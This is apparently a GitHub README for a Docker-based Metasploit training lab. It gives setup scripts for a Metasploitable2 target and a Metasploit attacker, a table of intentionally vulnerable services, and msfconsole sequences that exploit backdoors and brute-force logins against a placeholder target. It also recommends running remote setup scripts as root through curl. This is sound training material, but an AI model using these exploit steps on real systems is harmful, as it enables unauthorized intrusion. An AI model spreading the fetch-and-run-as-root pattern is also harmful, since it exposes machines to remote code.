# Metasploit Lab — Docker Setup

A two-machine penetration testing lab using Docker.  
No ISO upload required — everything is pulled from Docker Hub.

```
┌─────────────────────┐          ┌──────────────────────┐
│   Attacker Machine  │          │    Target Machine     │
│   Metasploit MSF    │─────────▶│   Metasploitable2     │
│   (setup_attacker)  │  network │   (setup_target)      │
└─────────────────────┘          └──────────────────────┘
```

---

## Requirements

- Ubuntu 18.04+ or Debian 9+ on both machines
- Internet access (scripts pull images from Docker Hub)
- Both machines on the same network
- `sudo` / root access

---

## Quick Start

### 1. Target Machine — Run Metasploitable2

Clone and run:
```bash
git clone https://github.com/sudichai/metasploitable2-docker-lab.git
cd metasploitable2-docker-lab
sudo bash target/setup_target.sh
```

Or pull and run in one line, no clone needed:
```bash
sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/sudichai/metasploitable2-docker-lab/master/target/setup_target.sh)"
```

This will:
- Install Docker if not present
- Pull `tleemcjr/metasploitable2` image
- Start container with `--network host` (target uses the host machine's real IP)
- Wait 30 seconds for all services to start
- Verify all ports and processes are running

**Vulnerable services exposed:**

| Port | Service |
|------|---------|
| 21 | FTP (vsftpd 2.3.4 backdoor) |
| 22 | SSH |
| 23 | Telnet |
| 80 | HTTP (Apache + DVWA + Mutillidae) |
| 139/445 | Samba (usermap_script) |
| 1099 | Java RMI |
| 3306 | MySQL (no root password) |
| 3632 | distccd |
| 5432 | PostgreSQL (weak credentials) |
| 5900 | VNC |
| 6667/6697 | UnrealIRCd (backdoor) |
| 8009 | Tomcat AJP |
| 8180 | Tomcat HTTP Manager |
| 8787 | Ruby DRb |

---

### 2. Attacker Machine — Run Metasploit Framework

Clone and run:
```bash
git clone https://github.com/sudichai/metasploitable2-docker-lab.git
cd metasploitable2-docker-lab
sudo bash attacker/setup_attacker.sh
```

Or pull and run in one line, no clone needed:
```bash
sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/sudichai/metasploitable2-docker-lab/master/attacker/setup_attacker.sh)"
```
> Use `bash -c "$(curl ...)"` rather than `curl | bash` — piping would hand the script's stdin to curl's output instead of your terminal, breaking the TUI input box below.

This will:
- Install Docker if not present
- Install `whiptail` if not present (powers the TUI prompt)
- Pull `metasploitframework/metasploit-framework` image
- Create `~/.msf4` for persistent loot/sessions across runs
- Show a TUI input box asking for the target IP, then launch `msfconsole` with `LHOST` and `RHOSTS` pre-set

---

## Useful MSF Modules for Metasploitable2

```
# FTP Backdoor (port 21)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
run

# Samba (port 445)
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
run

# UnrealIRCd Backdoor (port 6667)
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <TARGET_IP>
run

# distccd (port 3632)
use exploit/unix/misc/distcc_exec
set RHOSTS <TARGET_IP>
run

# Java RMI (port 1099)
use exploit/multi/misc/java_rmi_server
set RHOSTS <TARGET_IP>
run

# Tomcat Manager (port 8180) — brute force first
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <TARGET_IP>
set RPORT 8180
run

# PostgreSQL weak credentials (port 5432)
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <TARGET_IP>
run

# MySQL no root password (port 3306)
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <TARGET_IP>
set USERNAME root
run
```

---

## Container Management

### Target machine
```bash
sudo docker ps                              # check status
sudo docker logs metasploitable             # view logs
sudo docker exec -it metasploitable bash    # open shell inside
sudo docker stop metasploitable             # stop
sudo docker start metasploitable            # start again
```

### Attacker machine
```bash
# MSF container auto-removes after exit
# Re-run the script to start a new session
sudo bash attacker/setup_attacker.sh
```

---

## Network Architecture

Both containers run with `--network host`, meaning they bind directly to the real IP of their host machine — no port mapping or NAT needed. Traffic flows as if both services are running natively.

```
Kali / Attacker       Firewall / Router       Target (Metasploitable2)
192.168.x.x     ───────────────────────────▶  192.168.x.x
msfconsole                                      all vulnerable ports open
```

---

## Security Warning

> **⚠️ WARNING**  
> Metasploitable2 contains **real, intentionally unpatched vulnerabilities**.  
> Always run this lab in an **isolated network** (no internet exposure).  
> Never expose the target machine to a production or shared network.

---

## Tested On

- Ubuntu 20.04 LTS (target machine)
- Kali Linux 2024 (attacker machine)
